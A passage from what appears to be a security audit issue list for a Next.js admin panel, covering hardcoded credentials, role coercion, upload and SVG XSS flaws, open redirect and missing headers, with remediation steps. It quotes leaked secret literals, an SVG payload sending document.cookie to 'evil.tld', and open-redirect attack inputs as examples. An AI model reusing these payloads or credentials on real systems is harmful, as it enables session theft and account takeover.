3. Delete the literal from the repository; add the CI guard from TEST-006 (`grep -r "Admin@ScrubX2026" . --exclude-dir=node_modules` must fail the build).
4. Add to `.env.example`:
   ```
   # Admin bootstrap (required for `npm run auth:seed-admin`) — never commit real values
   ADMIN_EMAIL="admin@example.com"
   ADMIN_PASSWORD=""          # required, min 12 chars (openssl rand -base64 24)
   ADMIN_NAME="Administrator"
   ADMIN_ROLE="super_admin"   # super_admin | admin | staff
   ```
5. Record in `docs/ai-context/AUTH_CONTEXT.md`: **any environment seeded before this fix must rotate the admin password**, because the previous credential is compromised by publication.

**Expected Behavior After Fix:**
`npm run auth:seed-admin` without `ADMIN_PASSWORD` exits non-zero with an actionable message. With a password set it seeds normally and never echoes the value. No credential literal exists in the repository.

**Dependencies:**
- **Depends on** SEC-001 (removes the third copy).
- Ship in the same change set as SEC-001.

**Testing Requirements:**
- Normal: `ADMIN_PASSWORD='Str0ngPassphrase!' npm run auth:seed-admin` → success, password not printed.
- Failure: unset `ADMIN_PASSWORD` → exit 1, message names the variable.
- Failure: `ADMIN_PASSWORD='short'` → exit 1.
- Failure: `ADMIN_ROLE=customer` → exit 1.
- Regression: `grep -rn "Admin@ScrubX2026" . --exclude-dir=node_modules` → no matches.

**Acceptance Criteria:**
- [x] No literal password in any tracked file.
- [x] `create-admin.ts` fails fast without `ADMIN_PASSWORD`.
- [x] `test-auth.ts` skips instead of falling back.
- [x] `.env.example` documents the admin variables.
- [x] `AUTH_CONTEXT.md` records the rotation requirement.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### SEC-003 — Hardcoded Better Auth secret fallback

**Priority:** P0
**Category:** Security
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/lib/auth.ts
.env.example
docs/ai-context/AUTH_CONTEXT.md
```

**Problem Description:**
`src/lib/auth.ts:49-52` falls back to a literal 64-character hex string when `BETTER_AUTH_SECRET` is unset. That literal is public in git. Better Auth signs session cookies with this secret; a known secret allows session-token forgery.

**Current Implementation:**
```ts
trustedOrigins: [ process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000" ],
secret:
  process.env.BETTER_AUTH_SECRET ||
  "17f75554cdebbee61b5ca2302d9c636a05f834859ddb54538c9f43642e2158bc",
baseURL:
  process.env.BETTER_AUTH_URL || process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000",
```
`trustedOrigins` silently trusts `localhost` when the env var is missing, which either breaks legitimate sign-in in production or accepts the wrong origin depending on deployment.

**Root Cause:**
Secret material was given a development default instead of being a hard requirement. Only non-secret configuration (URLs, ports) may default.

**Real-World Failure Scenario:**
`BETTER_AUTH_SECRET` is omitted from the host's environment (common when only `DATABASE_URL` and the ImageKit keys are copied). Every deployment then signs cookies with the published literal. Anyone with repository access forges a `better-auth.session_token` for any user and is authenticated without a password.

**Required Implementation:**

1. Add a `requireEnv(name)` helper in `src/lib/auth.ts` that throws `Missing required environment variable: <name>` (never the value) when unset or blank.
2. Use `secret: requireEnv("BETTER_AUTH_SECRET")`, plus a minimum-length assertion of 32 characters. Evaluate lazily inside the `betterAuth({...})` options so the throw happens on first server use, not at module parse time.
3. `trustedOrigins`: build from comma-separated `BETTER_AUTH_TRUSTED_ORIGINS` if present, else `[requireEnv("NEXT_PUBLIC_APP_URL")]`. Allow `http://localhost:3000` only when `NODE_ENV !== "production"`.
4. `baseURL`: `requireEnv("BETTER_AUTH_URL")` in production, else `NEXT_PUBLIC_APP_URL`, else localhost outside production.
5. Document `BETTER_AUTH_TRUSTED_ORIGINS` in `.env.example`.
6. **Operational prerequisite:** rotating `BETTER_AUTH_SECRET` invalidates all sessions. Record this in `AUTH_CONTEXT.md` and in §14 — rotate, then expect every staff member to re-login.

**Expected Behavior After Fix:**
The first auth call throws a named, value-free error when the secret is absent or shorter than 32 characters. No secret literal exists in the repository. Cookies are signed with a deployment-specific secret.

**Dependencies:** Independent; ship with SEC-002.

**Testing Requirements:**
- Failure: unset secret → first `auth.api.getSession` throws naming the variable.
- Failure: `BETTER_AUTH_SECRET=short` → throws.
- Normal: 32+ char secret → login succeeds.
- Edge: rotating the secret invalidates an existing cookie → redirect to `/login`, not `500`.
- Regression: `grep -rn "17f75554" . --exclude-dir=node_modules` → no matches.

**Acceptance Criteria:**
- [x] No secret literal in `src/lib/auth.ts`.
- [x] Missing/short secret produces a named, value-free error.
- [x] No unconditional `localhost` trust in production.
- [x] `.env.example` documents `BETTER_AUTH_TRUSTED_ORIGINS`.
- [x] `AUTH_CONTEXT.md` records the rotation consequence.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### SEC-004 — Unknown roles are coerced to `staff` (customer → staff privilege escalation)

**Priority:** P0
**Category:** Security
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/auth.ts
src/lib/auth-guard.ts
src/db/schema/auth.ts
docs/ai-context/AUTH_CONTEXT.md
docs/ai-context/DECISIONS.md
```

**Problem Description:**
Both authorization stacks treat an unrecognised user role as `staff`. Because `staff` is the lowest admin role and every guard accepts at least `staff`, a principal whose role is `customer`, `"Customer"`, `""`, or `NULL` is granted full staff access to the admin console.

**Current Implementation:**

`src/server/auth.ts` (`getCurrentAdmin`), lines 71-73:
```ts
const rawRole = (user.role as AdminRole) || "staff";
const validRoles: AdminRole[] = ["super_admin", "admin", "staff"];
const role: AdminRole = validRoles.includes(rawRole) ? rawRole : "staff";
```
There is no rejection path: an unknown role can never produce `AuthenticationError`.

`src/lib/auth-guard.ts`:
```ts
const userRole = (user.role as AdminRole) || "staff";
if (!allowedRoles.includes(userRole)) redirect("/login?error=forbidden");
```
Same default. This stack is used by `src/actions/media.ts` and `src/app/api/upload/auth/route.ts`.

`src/db/schema/auth.ts` defines a role enum that includes `customer` (ADR 008), so `customer` is a reachable value, not a hypothetical.

**Root Cause:**
The fallback existed to let the seeded administrator pass a `staff` guard before `role` was populated. It was never revisited once the column became mandatory. The hierarchy helper `hasMinimumRole` correctly returns `false` for unknown roles (`ROLE_HIERARCHY[userRole] || 0`) — but callers bypass it by pre-coercing to `staff`.

**Real-World Failure Scenario:**
The separate storefront codebase creates a `ba_user` row with `role = "customer"` when a customer registers to track an order. That customer visits `https://admin.scrubx.pk/login`, authenticates with their own credentials, and is admitted. `requireStaffContext()` returns `role: "staff"`, so they can read every customer record, every payment proof, and every order; they can call `createOrderAction`, `submitPaymentProofAction`, and `updateOrderShippingAction` (all `staff`-level), the last of which bypasses the FSM entirely (BUG-006) and can mark any order shipped.

**Required Implementation:**

1. In `src/server/auth.ts`, replace coercion with strict resolution:
   ```ts
   const ROLE_SET = new Set<AdminRole>(["super_admin", "admin", "staff"]);
   const rawRole = typeof user.role === "string" ? user.role.trim() : "";
   if (!ROLE_SET.has(rawRole as AdminRole)) {
     throw new AuthorizationError(
       "Your account does not have administrative access. Contact a Super Administrator."
     );
   }
   const role = rawRole as AdminRole;
   ```
   Behaviour change to state explicitly: unknown/absent role is now **denied**, never promoted.
2. Apply the identical rule in `src/lib/auth-guard.ts` — or, preferably, delete the duplicate and have it delegate (ARCH-001). Do not keep two copies.
3. Do not swallow the new error. `requireStaffContext`/`requireAdminContext` redirect to `/login` on failure. A signed-in-but-unauthorized user bounced to `/login` produces a loop because the proxy sends them back to `/`. Distinguish the cases: no session ⇒ `/login`; session with insufficient role ⇒ `/login?error=forbidden`, and ensure the proxy does not bounce `/login?error=forbidden` back to `/` for such a user (coordinate with BUG-032).
4. Verify the seeded admin is actually `super_admin` (it is — `create-admin.ts:29`), and add the Phase 0 query `SELECT role, count(*) FROM ba_user GROUP BY role;` (**prerequisite: production read access; Not Verified until run**).
5. Document the rule in `AUTH_CONTEXT.md` and add an ADR: "Unknown roles are denied, never defaulted."

**Expected Behavior After Fix:**
A user with `role = "customer"` (or any value outside the three admin roles, or `NULL`) receives a `403`-equivalent everywhere: RSC loads redirect to `/login?error=forbidden`, Server Actions return `{ success: false, code: "FORBIDDEN" }`, route handlers return `403` JSON. No `AdminContext` is ever built from an inferred role.

**Dependencies:**
- **Depends on** ARCH-001 (single auth stack).
- **Blocks** SEC-005.
- **Related** BUG-032 (redirect loop must be solved together).

**Testing Requirements:**
- Normal: each of `super_admin`, `admin`, `staff` reaches its permitted pages and actions.
- Security: `role='customer'` ⇒ `GET /` → 307 to `/login?error=forbidden`; a staff action returns `FORBIDDEN`; `/api/upload/auth` → 403.
- Security: `role IS NULL` ⇒ same.
- Security: `role='Admin'` (wrong case) ⇒ denied (canonical lowercase only).
- Edge: banned user still receives the ban message, not the role message.
- Regression: seeded super admin unaffected.

**Acceptance Criteria:**
- [x] No `|| "staff"` / `: "staff"` default remains in either auth module.
- [x] Unknown role ⇒ `AuthorizationError` in exactly one place.
- [x] `customer` cannot read any page or invoke any action (TEST-002 matrix).
- [x] Denied-but-authenticated users land on `/login?error=forbidden` exactly once.
- [x] ADR added.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### SEC-005 — `/api/upload/auth` issues ImageKit signatures to any authenticated user

**Priority:** P0
**Category:** Security
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/api/upload/auth/route.ts
src/lib/auth-guard.ts
src/lib/imagekit-upload.ts
src/components/shared/image-upload.tsx
src/server/validation/common.ts
```

**Problem Description:**
The upload-signature endpoint verifies that *a* session exists and that the user is not banned, but never checks the role. Any authenticated principal — including a `customer` admitted by SEC-004 — receives valid ImageKit authentication parameters (`token`, `expire`, `signature`) and can upload arbitrary files into the ImageKit account, into any folder.

**Current Implementation:**
`src/app/api/upload/auth/route.ts`:
```ts
const session = await getSession();
if (!session || !session.user) return NextResponse.json({…}, { status: 401 });
const user = session.user as typeof session.user & { banned?: boolean };
if (user.banned) return NextResponse.json({…}, { status: 403 });
const authParams = imagekit.getAuthenticationParameters();
return NextResponse.json(authParams);
```
`getSession` comes from `@/lib/auth-guard` and performs no role evaluation. There is no folder binding, no type binding and no rate limit. `getAuthenticationParameters()` is scoped only by ImageKit account settings, which `.env.example` does not constrain.

The signature is then used by `src/lib/imagekit-upload.ts` to POST directly to `https://upload.imagekit.io/api/v1/files/upload` with a **client-chosen** `folder` and `fileName` taken from `options.folder` (default `/scrubx/products`).

**Root Cause:**
The route implements the token half of ADR 012 ("direct client upload with ephemeral auth tokens") but not the authorization half: it authenticates the *person*, not the *capability*.

**Real-World Failure Scenario:**
Any non-staff authenticated user (or a stolen staff credential, or a session obtained via SEC-001) calls `/api/upload/auth`, then uploads gigabytes of arbitrary content, consuming the plan quota and hosting material under the brand's CDN domain. Because the client picks `folder`, uploads can land in `/scrubx/payment-proofs` or any other prefix that downstream code treats as trusted.

**Required Implementation:**

1. Replace `getSession()` with the error-based staff guard:
   ```ts
   let admin: AdminContext;
   try { admin = await requireStaffContext({ redirect: false }); }
   catch (err) {
     if (err instanceof AuthenticationError) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
     return NextResponse.json({ error: "Forbidden" }, { status: 403 });
   }
   ```
   This inherits SEC-004's strict role resolution automatically.
2. **Bind the capability.** Accept `?folder=` (or `?purpose=`), validate it against the existing folder enum in `src/server/validation/common.ts` (`/scrubx/products`, `/scrubx/categories`, `/scrubx/engraving-logos`, `/scrubx/payment-proofs`), reject anything else with `400`, and return the validated folder in the response:
   ```ts
   { token, expire, signature, folder: validatedFolder }
   ```
   Change `src/lib/imagekit-upload.ts` so the `folder` it submits is `authParams.folder`; keep `options.folder` only as the value sent in the request, and fail loudly if the server echoes a different folder.
3. Restrict `payment-proofs` uploads to the same staff guard (proofs are staff-uploaded on behalf of customers). If a customer-facing flow is added later it must use a separate, narrowly scoped endpoint — record that in `docs/ai-context/IMAGEKIT_CONTEXT.md`.
4. Apply a per-user rate limit (30 signature requests / 10 minutes) using the limiter built in SEC-011. Do not add a dependency.
5. Keep `export const dynamic = "force-dynamic"`.

**Expected Behavior After Fix:**
Only `super_admin` / `admin` / `staff` receive signatures. A signature is valid only for a server-validated folder. Non-staff receives `401`/`403` JSON. Excess requests receive `429`.

**Dependencies:**
- **Depends on** SEC-004 (role resolution) and ARCH-001 (shared guard).
- **Related** SEC-006/SEC-007 (the file itself must still be validated by content).

**Testing Requirements:**
- Normal: staff `?folder=/scrubx/products` → `200` with matching `folder`.
- Security: `customer` role → `403`; unauthenticated → `401`.
- Validation: `?folder=/etc` → `400`.
- Rate limit: 31st request in the window → `429`.
- End-to-end upload against a test ImageKit account (**requires credentials — Not Verified without them**).

**Acceptance Criteria:**
- [x] Role check inherited from `src/server/auth.ts`.
- [x] Folder validated server-side and echoed to the client.
- [x] Client no longer sends an unvalidated folder.
- [x] Rate limiting applied.
- [x] `IMAGEKIT_CONTEXT.md` documents the folder binding.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### SEC-006 — SVG uploads enable stored XSS

**Priority:** P0
**Category:** Security
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/actions/media.ts
src/server/validation/common.ts
src/components/shared/image-upload.tsx
src/lib/imagekit-upload.ts
docs/ai-context/IMAGEKIT_CONTEXT.md
```

**Problem Description:**
Three independent allowlists include `image/svg+xml`. SVG is an executable document format (`<script>`, `<foreignObject>`, event handlers, external references). Files are stored on `ik.imagekit.io` and are opened directly from the admin UI, so an uploaded SVG can execute script when viewed.

**Current Implementation:**
- `src/actions/media.ts:5-11`: `const ALLOWED_MIME_TYPES = ["image/jpeg","image/png","image/webp","image/avif","image/svg+xml"];`
- `src/server/validation/common.ts`: `fileUploadMetaSchema.mimeType` enum includes `"image/svg+xml"`, and its error message advertises "Allowed: JPEG, PNG, WebP, AVIF, SVG".
- `src/components/shared/image-upload.tsx:75-81`: `DEFAULT_ACCEPTED_MIMES` includes `"image/svg+xml"`; `validateFile` (lines 126-135) checks only `file.type` and `file.size`.
- `docs/ai-context/PROJECT_OVERVIEW.md` describes engraving logos as "customer-uploaded logo vector files", so SVG is an intended input for `/scrubx/engraving-logos`.

**Root Cause:**
SVG was treated as "an image format" rather than "an XML document with script execution". Client-side `file.type` checking provides no protection.

**Real-World Failure Scenario:**
A `logo.svg` containing `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://evil.tld/c?d='+document.cookie)</script></svg>` is uploaded as an engraving logo and stored at `https://ik.imagekit.io/scrubx/.../logo.svg`. A staff member opens the file directly from the order screen; the script executes on the ImageKit origin and can perform drive-by actions, and if the file is ever inlined or proxied through the app origin it executes with the admin session.

**Required Implementation:**

1. Remove `image/svg+xml` from **all three** allowlists and update every user-facing string that enumerates allowed types.
2. Handle the genuine vector requirement explicitly:
   - Accept raster only (`jpeg`, `png`, `webp`, `avif`) in this phase.
   - Record a follow-up (ECOM-013) for a *safe* vector path: server-side rasterisation to PNG, or accept PNG/PDF exports. **Do not** add an "SVG for logos only" carve-out here — that needs a sanitiser and a new dependency (Safety Rule 8).
3. Defence in depth in `src/lib/imagekit-upload.ts`: reject before requesting a signature when `file.type === "image/svg+xml"`. The server remains authoritative.
4. Record in `docs/ai-context/IMAGEKIT_CONTEXT.md`: "ImageKit account-level allowed file types must exclude SVG. **Requires ImageKit dashboard access — Not Verified until confirmed.**"
5. List existing SVG assets for manual review (do not auto-delete) — §8.2 Q6.

**Expected Behavior After Fix:**
SVG is rejected in the component, in the signature folder/type policy and in `uploadServerMediaAction`. Only JPEG/PNG/WebP/AVIF can be uploaded. Existing SVG rows are untouched but no new ones can be created.

**Dependencies:**
- **Depends on** SEC-007 (content validation must also reject non-images that claim to be PNG).
- **Related** SEC-005.

**Testing Requirements:**
- Failure: upload `logo.svg` (MIME `image/svg+xml`) → rejected with a clear message.
- Failure: rename `logo.svg` → `logo.png` then upload → rejected by magic-byte check (SEC-007).
- Normal: JPEG/PNG/WebP/AVIF uploads succeed.
- Regression: drag-and-drop and URL-entry paths still work.
- Manual: confirm the ImageKit account allowlist (**prerequisite**).

**Acceptance Criteria:**
- [ ] `image/svg+xml` in zero allowlists.
- [ ] UI copy no longer advertises SVG.
- [ ] Raster uploads unaffected.
- [ ] `IMAGEKIT_CONTEXT.md` records the account requirement and the vector follow-up.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### SEC-007 — Upload validation trusts the client-declared MIME type

**Priority:** P0
**Category:** Security
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/actions/media.ts
src/lib/imagekit-upload.ts
src/app/api/upload/auth/route.ts
src/components/shared/image-upload.tsx
src/server/validation/common.ts
```

**Problem Description:**
Every upload path decides "is this an image?" from `File.type`, which browsers derive from the file extension and which an attacker controls. No path inspects the bytes. `grep -rn "magic\|ffd8ff\|89504e47" src/` returns nothing.

**Current Implementation:**
- `src/actions/media.ts` `uploadServerMediaAction`: `ALLOWED_MIME_TYPES.includes(file.type)` → size check → `Buffer.from(await file.arrayBuffer())` → `imagekit.upload(...)`. No signature inspection.
- `src/lib/imagekit-upload.ts` `uploadToImageKit`: builds `FormData` from the raw `File` and POSTs; the only gate is the caller-side `validateFile`.
- `src/components/shared/image-upload.tsx` `validateFile`: `acceptedMimeTypes.includes(file.type)` only.

A file named `payload.png` containing an HTML document reports `type === "image/png"` and is stored and served by ImageKit.

**Root Cause:**
MIME verification was implemented as a *declaration* check rather than a *content* check.

**Real-World Failure Scenario:**
An attacker uploads a `.png` that is actually HTML; ImageKit stores and serves it. Combined with CDN content delivery this creates a phishing surface under the brand's media domain, and the file survives `deleteMediaAction`'s fileId regex because ImageKit generated the ID.

**Required Implementation:**

1. Add a server-only validator `src/server/media/validate-image-bytes.ts`:
   ```ts
   const SIGNATURES = [
     { mime: "image/jpeg", test: (b: Uint8Array) => b[0] === 0xFF && b[1] === 0xD8 && b[2] === 0xFF },
     { mime: "image/png",  test: (b) => b[0] === 0x89 && b[1] === 0x50 && b[2] === 0x4E && b[3] === 0x47 },
     { mime: "image/webp", test: (b) => b[0]===0x52&&b[1]===0x49&&b[2]===0x46&&b[3]===0x46&&b[8]===0x57&&b[9]===0x45&&b[10]===0x42&&b[11]===0x50 },
     { mime: "image/avif", test: (b) => /* "ftypavif"/"ftypavis" within first 32 bytes */ },
   ];
   ```
   Export `detectImageMime(bytes): string | null` and `assertImageBytes(bytes, declaredMime): string`.
2. Apply it in `uploadServerMediaAction` **before** the ImageKit call: read the buffer, detect, reject when the detected MIME is not allowlisted **or** differs from `file.type` (a mismatch is an attack signal — reject rather than "trust the bytes").
3. For direct uploads, validate server-side after the fact. Preferred: add `confirmMediaUploadAction({ fileId, url, declaredMime, size })` that uses the ImageKit server SDK (file details + a ranged `GET` of the first 32 bytes) to detect the type, and on mismatch calls `deleteFile` and returns a validation error. The client must call it before attaching the file to any product. (Alternative — proxying all uploads through the server — is an ADR-level change; do not take it silently.)
4. Enforce the 5 MB limit server-side for the direct path too: compare `imagekit.getFileDetails(fileId).size` with `MAX_FILE_SIZE_BYTES` in `confirmMediaUploadAction`.
5. Keep the client-side `validateFile` and label it UX-only in a comment.

**Expected Behavior After Fix:**
A file whose bytes are not a permitted raster image is never attached to a product, payment or engraving. Declared/detected mismatches are rejected and the stored object deleted.

**Dependencies:**
- **Depends on** SEC-006.
- **Related** SEC-005, BUG-021 (fabricated `imagekitFileId`).

**Testing Requirements:**
- Failure: `payload.png` containing HTML → rejected, ImageKit object deleted.
- Failure: JPEG bytes declared `image/png` → rejected.
- Normal: genuine images accepted.
- Edge: 2-byte truncated file → rejected without throwing.
- Edge: 5 MB + 1 byte → rejected.
- Manual: verify object removal (**requires credentials**).

**Acceptance Criteria:**
- [ ] Magic-byte validation exists server-side and runs on every upload path.
- [ ] Mismatch ⇒ rejection + cleanup.
- [ ] Size enforced server-side.
- [ ] Client validation documented as UX-only.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### SEC-008 — Open redirect via `?from=` on the login page

**Priority:** P0
**Category:** Security
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/Login.tsx
src/proxy.ts
src/lib/safe-redirect.ts   (new)
```

**Problem Description:**
The login view reads `?from=` and passes it directly to `router.push()` after a successful sign-in, without validating that it is a same-origin relative path. `?from=https://evil.tld` sends a freshly authenticated administrator to an attacker-controlled page.

**Current Implementation:**
`src/views/Login.tsx:16`: `const from = searchParams.get("from") || "/";`
`src/views/Login.tsx:52-53`: `router.push(from); router.refresh();`
No allowlist, no URL parsing, no protocol check. `src/proxy.ts` *writes* `from` (`loginUrl.searchParams.set("from", pathname)`), so the parameter is a first-class part of the flow.

**Root Cause:**
The parameter was designed as an internal path (proxy-generated) but consumed as an arbitrary string (user-controlled). Nothing constrained its shape.

**Real-World Failure Scenario:**
An attacker sends `https://admin.scrubx.pk/login?from=https://scrubx-login-verify.tld`. The victim sees the genuine login page, enters real credentials, and is redirected to a pixel-perfect clone asking them to "re-verify" — a credential-harvesting chain built on a trusted domain.

**Required Implementation:**

1. Add `src/lib/safe-redirect.ts`:
   ```ts
   export function safeInternalPath(value: string | null | undefined, fallback = "/"): string {
     if (!value) return fallback;
     const v = value.trim();
     if (!v.startsWith("/") || v.startsWith("//") || v.startsWith("/\\")) return fallback;
     if (v.includes("://")) return fallback;
     if (/[\u0000-\u001f\u007f]/.test(v) || /%2f%2f|%5c/i.test(v)) return fallback;
     return v;
   }
   ```
2. Use it in `src/views/Login.tsx`: `const from = safeInternalPath(searchParams.get("from"));`
3. Apply it in `src/proxy.ts` before writing `from` (defence in depth) and in any future post-login redirect.
4. Do not attempt a hostname allowlist — only relative paths are needed.

**Expected Behavior After Fix:**
`?from=/orders?page=2` works. `?from=https://evil.tld`, `?from=//evil.tld`, `?from=/\evil.tld`, `?from=javascript:alert(1)`, `?from=%2F%2Fevil.tld` all resolve to `/`.

**Dependencies:** None.

**Testing Requirements:**
- Unit: table-driven test over `""`, `null`, `"/"`, `"/products/abc"` and the six malicious inputs.
- Integration: each malicious `from` → lands on `/`.
- Integration: `?from=/inventory` → lands on `/inventory`.
- Regression: proxy still sets `from` for deep links.

**Acceptance Criteria:**
- [x] `safeInternalPath` exists, is pure and unit-tested.
- [x] `Login.tsx` uses it.
- [x] No unvalidated redirect target remains.
- [x] All malicious inputs land on `/`.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### SEC-009 — `deleteMediaAction` can delete arbitrary ImageKit assets

**Priority:** P0
**Category:** Security
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/actions/media.ts
src/components/shared/image-upload.tsx
src/views/ProductForm.tsx
src/server/services/product.service.ts
```

**Problem Description:**
`deleteMediaAction(fileId)` accepts any syntactically valid ImageKit file ID and permanently deletes it, without checking that the ID is referenced by a record the caller may modify. Combined with BUG-017 (deletion fires *before* the form is saved), this is a destructive primitive available to any `admin`.

**Current Implementation:**
```ts
export async function deleteMediaAction(fileId: string) {
  await requireAdmin();
  if (!/^[a-zA-Z0-9_-]+$/.test(fileId)) return { success: false, ... };
  await imagekit.deleteFile(fileId);
  return { success: true };
}
```
No database lookup. The regex validates *shape*, not *ownership*. `requireAdmin()` comes from `src/lib/auth-guard.ts` — the second auth stack (ARCH-001) carrying the SEC-004 role default.

**Root Cause:**
Deletion was modelled as an infrastructure operation ("remove a file") rather than a domain operation ("detach a product image"). ImageKit file IDs are global to the account, so the blast radius is the whole media library.

**Real-World Failure Scenario:**
An admin edits product A, removes an image (BUG-017 fires the delete immediately), then abandons the form. The file is gone from ImageKit while the `product_images` row still references it — a permanently broken storefront image. Worse, an admin who can open any product form can read its image file IDs from the DOM and delete them for any other product; ImageKit deletions are irreversible.

**Required Implementation:**

1. **Split the operation.** Replace `deleteMediaAction` with a domain-scoped action:
   ```ts
   export const detachProductImageAction = createSafeAction(
     { schema: z.object({ productId: uuidSchema, imageId: uuidSchema }), requiredRole: "admin" },
     async ({ input, admin }) => productService.detachImage(input, admin)
   );
   ```
   `productService.detachImage` deletes the `product_images` row inside a transaction and queues the ImageKit purge **after commit**, mirroring the existing `imageFilesToPurge` pattern (`product.service.ts:592-597`).
2. Remove `deleteMediaAction` and both call sites (`image-upload.tsx:321`, `ProductForm.tsx:394`).
3. Orphan cleanup (uploads never attached) must be a **server-side reaper**, not a client-callable delete: `purgeOrphan(fileId, uploadSessionId)` gated on `super_admin`, where `uploadSessionId` was issued by SEC-007's `confirmMediaUploadAction`. Do not ship this in Phase 1 unless needed — an orphaned upload is harmless; an over-powered delete is not.
4. Every remaining ImageKit deletion (`product.service.ts:35-42` `safeDeleteImageKitFile`, `deleteProduct` at line 659) must run **after** the DB transaction commits and must log the file ID and outcome. Never perform external I/O inside a DB transaction — it holds row locks across a network call.
5. Use the unified guard (ARCH-001), not `requireAdmin` from `src/lib/auth-guard.ts`.

**Expected Behavior After Fix:**
No client-callable "delete any file" action exists. Removing an image from an unsaved form mutates local state only. Purging happens after a successful save, post-commit. A file ID belonging to another product cannot be deleted by ID.

**Dependencies:**
- **Depends on** BUG-017 (must land together — removing the action without moving the call sites breaks the uploader).
- **Related** BUG-021, DB-009, ECOM-008.

**Testing Requirements:**
- Normal: remove an image and save → row deleted, file purged once, log line emitted.
- Normal: remove an image and navigate away → nothing deleted (ImageKit object still exists).
- Security: `detachProductImageAction` with another product's `imageId` → `404`/`403`.
- Failure: ImageKit delete fails → DB change still committed, failure logged.
- Regression: `deleteProduct` still purges after a successful delete.

**Acceptance Criteria:**
- [ ] `deleteMediaAction` no longer exists.
- [ ] No client component calls an ImageKit deletion directly.
- [ ] Deletions occur only after commit.
- [ ] Cross-product image IDs rejected.
- [ ] Failures logged and never roll back the DB change.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### SEC-010 — Missing HTTP security headers

**Priority:** P1
**Category:** Security
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
next.config.ts
```

**Problem Description:**
`next.config.ts` configures only `reactStrictMode` and `images`. There is no `headers()` block and no `poweredByHeader: false`, so the app ships without HSTS, `X-Content-Type-Options`, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, `Permissions-Policy`, or CSP.

**Current Implementation:**
```ts
const nextConfig: NextConfig = {
  reactStrictMode: true,
  images: { formats: ['image/avif','image/webp'], remotePatterns: [{ protocol:'https', hostname:'ik.imagekit.io', pathname:'/**' }] },
};
```
`src/proxy.ts` sets no headers on either branch.

**Root Cause:**
Headers were never added; framework defaults are permissive and `X-Powered-By` is on by default.

**Real-World Failure Scenario:**
The admin panel is frameable, enabling clickjacking against destructive controls ("Refund payment", "Cancel order", "Archive product"). MIME sniffing lets crafted uploads render as HTML in some contexts. Without HSTS the first request can be downgraded on hostile networks.

**Required Implementation:**

1. Add an async `headers()` to `next.config.ts` with one rule for `source: "/(.*)"`:
   - `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
   - `X-Content-Type-Options: nosniff`
   - `X-Frame-Options: DENY`
   - `Referrer-Policy: strict-origin-when-cross-origin`
   - `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()`
2. Set `poweredByHeader: false`.
3. Add **report-only** CSP first (Next.js injects inline scripts):
   ```
   default-src 'self';
   img-src 'self' data: blob: https://ik.imagekit.io;
   script-src 'self' 'unsafe-inline' 'unsafe-eval';
   style-src 'self' 'unsafe-inline';
   font-src 'self' data:;
   connect-src 'self' https://upload.imagekit.io https://ik.imagekit.io;
   frame-ancestors 'none'; base-uri 'self'; form-action 'self';
   ```
   Do not switch to enforcing mode in this issue; record the transition condition (zero report-only violations for 7 days).
4. Do not set headers in `src/proxy.ts` — `next.config.ts` covers static and dynamic responses uniformly.

**Expected Behavior After Fix:**
All responses carry the five headers plus `CSP-Report-Only`; `X-Powered-By` is gone.

**Dependencies:** None. **Related** SEC-006 (a strict CSP mitigates stored XSS as defence in depth).

**Testing Requirements:**
- `curl -I <base>/` and `<base>/login` → all headers present.
- `x-powered-by` absent.
- Console shows report-only violations recorded (not fixed here).
- `next/image` for `ik.imagekit.io` still renders.

**Acceptance Criteria:**
- [ ] Five headers on HTML and JSON responses.
- [ ] `poweredByHeader: false`.
- [ ] CSP report-only with the documented baseline.
- [ ] Image rendering unaffected.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### SEC-011 — Proxy matcher bypass and absent rate limiting

**Priority:** P1
**Category:** Security
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/proxy.ts
src/server/rate-limit.ts   (new)
src/server/action-client.ts
src/app/api/**/route.ts
```

**Problem Description:**
Three weaknesses in one area.

(a) **Matcher bypass.** The matcher excludes any path ending in `.svg|.png|.jpg|.jpeg|.gif|.webp|.ico`, plus `brand/` and `proofs/`. A route whose path can end with one of those extensions, or that lives under an excluded prefix, is never authenticated by the proxy. The negative-lookahead form also makes public prefixes implicit and easy to add by accident.

(b) **API behaviour.** The non-`/login` branch always issues a `307` redirect, even for `fetch`/XHR. API clients therefore receive an HTML redirect instead of `401`, which is why every `/api/inventory*` handler had to pass `{ redirect: false }` individually — and `adjust` forgot (ARCH-002).

(c) **No rate limiting.** `POST /api/auth/sign-in/email` and `/api/upload/auth` are unthrottled; `grep -rn "rateLimit\|ratelimit" src/` returns nothing and there is no `vercel.json`.

**Current Implementation:**
```ts
